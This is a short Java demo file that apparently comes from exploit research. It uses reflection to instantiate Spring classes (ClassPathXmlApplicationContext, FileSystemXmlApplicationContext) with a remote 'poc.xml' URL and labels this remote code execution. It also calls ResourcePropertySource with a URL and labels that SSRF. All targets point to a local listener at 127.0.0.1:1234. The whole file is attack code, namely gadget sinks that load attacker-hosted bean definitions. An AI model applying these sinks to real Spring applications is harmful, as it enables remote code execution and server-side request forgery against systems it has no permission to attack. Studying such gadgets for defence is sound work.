package com.ppp;

import java.lang.reflect.Constructor;

/**
 * @author Whoopsunix
 *
 * AbstractXmlApplicationContext 的实现 加载 xml
 */
public class XmlDemo {

    public static void main(String[] args) throws Exception{
        classPathXmlApplicationContextDemo();
    }

    /**
     * rce
     */
    // ClassPathXmlApplicationContext
    public static void classPathXmlApplicationContextDemo() throws Exception{
        Constructor constructor = Class.forName("org.springframework.context.support.ClassPathXmlApplicationContext").getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        constructor.newInstance("http://127.0.0.1:1234/poc.xml");

    }

    // FileSystemXmlApplicationContext
    public static void fileSystemXmlApplicationContextDemo() throws Exception{
        Constructor constructor = Class.forName("org.springframework.context.support.FileSystemXmlApplicationContext").getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        constructor.newInstance("http://127.0.0.1:1234/poc.xml");
    }

    /**
     * SSRF
     */
    // org.springframework.core.io.support.ResourcePropertySource
    public static void resourcePropertySourceDemo() throws Exception{
        Constructor constructor = Class.forName("org.springframework.core.io.support.ResourcePropertySource").getDeclaredConstructor(String.class, String.class);
        constructor.setAccessible(true);
        constructor.newInstance(null, "http://127.0.0.1:1234/11");
    }

}
